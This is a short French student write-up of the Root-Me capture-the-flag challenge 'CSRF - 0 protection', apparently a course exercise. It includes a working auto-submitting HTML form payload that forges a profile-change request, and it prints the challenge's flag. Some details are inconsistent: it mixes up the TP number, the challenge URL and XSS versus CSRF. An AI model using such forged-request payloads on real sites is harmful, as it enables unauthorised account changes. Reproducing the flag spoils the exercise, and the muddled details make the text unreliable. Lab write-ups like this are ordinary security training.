---
title: "TP 3 : rootme 9"
excerpt: "CSRF - 0 protection"
coverImage: "https://www.tice-education.fr/images/stories/img/rootmelogo.jpg"
date: "2025-07-01T12:05:00.000Z"
ogImage:
    url: "https://www.tice-education.fr/images/stories/img/rootmelogo.jpg"
---

# TP 1 : CSRF - 0 protection

## Informations générales

-   **Nom du challenge** : CSRF - 0 protection
-   **Difficulté** : 3
-   **URL** : https://www.root-me.org/fr/Challenges/Web-Client/Javascript-Authentification

---

## 1. Compréhension du challenge

### Objectif : Trouver cookie admin

### Contexte technique : forum avec form sensible au xss

---

## 2. Étapes de résolution

### Étape 1 : créer un compte

### Étape 2 : aller dans le profil puis contact

### Etape 3 : utiliser la faille XSS de la page de contact pour effectuer une redirection javascript et une validation du formulaire POST

```html
<form
    name="test"
    method="POST"
    action="http://challenge01.root-me.org/web-client/ch22/?action=profile"
>
    <input type="hidden" name="username" value="armand" />
    <input type="hidden" name="status" value="on" />
</form>
<script>
    document.test.submit();
</script>
```

### Etape 4 : Acceder à la page private en tant qu'admin et recuperer le flag

---

## 3. Capture ou extrait de code

![1](https://cdn.discordapp.com/attachments/1020343302052118589/1389547586079293450/image.png?ex=68650489&is=6863b309&hm=78ec9c4b9580cfcc7ee966530cf45a64f3b963ff69e75b7ac3d2435ea3dd75e9&)

![2](https://cdn.discordapp.com/attachments/1020343302052118589/1389549879424188508/image.png?ex=686506ab&is=6863b52b&hm=c1d011022335c78ce13a24bec8411b40de84efb20cd6c8206adaa0ca4015523d&)

![3](https://cdn.discordapp.com/attachments/1020343302052118589/1389549947568918538/image.png?ex=686506bc&is=6863b53c&hm=175d7c710d4ae184ae0eb0b09c802fb34afab564ecc40a836dd01e5a7590d15c&)

---

## 4. Explication technique

### Vulnérabilité exploitée : Manque de prrotection XSS sur les champs

---

## 5. Résultat : Csrf_Fr33style-L3v3l1!

---

## 6. Prévention / bonnes pratiques :

### Proteger les input des attaques XSS
